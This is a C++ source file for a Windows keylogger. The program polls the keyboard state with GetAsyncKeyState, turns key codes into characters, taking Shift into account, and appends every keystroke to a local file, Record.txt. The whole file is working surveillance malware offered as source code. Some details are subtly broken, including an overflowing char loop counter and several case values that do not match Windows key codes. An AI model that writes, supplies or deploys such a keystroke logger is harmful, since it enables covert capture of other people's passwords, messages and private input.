//============================================================================
// Name        : keylogger.cpp
// Author      : Sachin Lohith
// Version     : 1.0
//============================================================================

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

//void debug() {
//	char ascii;
//	while (1) {
//		cin >> ascii;
//		cout << endl << "Entered character was : " << ascii << " : "
//				<< (int) ascii << endl;
//	}
//}

void log() {
	char key;
	while (1) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				cout << "Key pressed";
				ofstream write("Record.txt", ios::app);

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					break;
				} else if ((key > 64) && (key < 91)) {
					write << key;
					break;
				} else {
					switch (key) {
					case VK_OEM_3: {
						if (GetAsyncKeyState(0x10))
							write << "~";
						else
							write << "`";
					}
						break;
					case 45: {
						if (GetAsyncKeyState(0x10))
							write << "_";
						else
							write << "-";
					}
						break;
					case 61: {
						if (GetAsyncKeyState(0x10))
							write << "+";
						else
							write << "=";
					}
						break;
					case 123: {
						if (GetAsyncKeyState(0x10))
							write << "{";
						else
							write << "[";
					}
						break;
					case 48: {
						if (GetAsyncKeyState(0x10))
							write << ")";
						else
							write << "0";
					}
						break;
					case 49: {
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write << "1";
					}
						break;
					case 50: {
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
					}
						break;
					case 51: {
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
					}
						break;
					case 52: {
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
					}
						break;
					case 53: {
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
					}
						break;
					case 54: {
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
					}
						break;
					case 55: {
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
					}
						break;
					case 56: {
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
					}
						break;
					case 57: {
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
					}
						break;
					case VK_SPACE:
						write << " ";
						break;
					case VK_RETURN:
						write << "\n";
						break;
					case VK_TAB:
						write << "	";
						break;
					case VK_BACK:
						write << "<backspace>";
						break;
					case VK_ESCAPE:
						write << "<esc>";
						break;
					case VK_DELETE:
						write << "<del>";
						break;
					default:
						break;
					}
				}
//				switch(key) {
//				case 8: write << "<backspace>"; break;
//				case 9: write << "<tab>"; break;
//				case 27: write << "<esc>"; break;
//				case 127: write << "<del>"; break;
//				case 32: write << " "; break;
//				case 13: write << "<enter>\n"; break;
//				default: write << key;
//				}
			}
		}
	}
}

int main() {
	log();
//	debug();
	return 0;
}
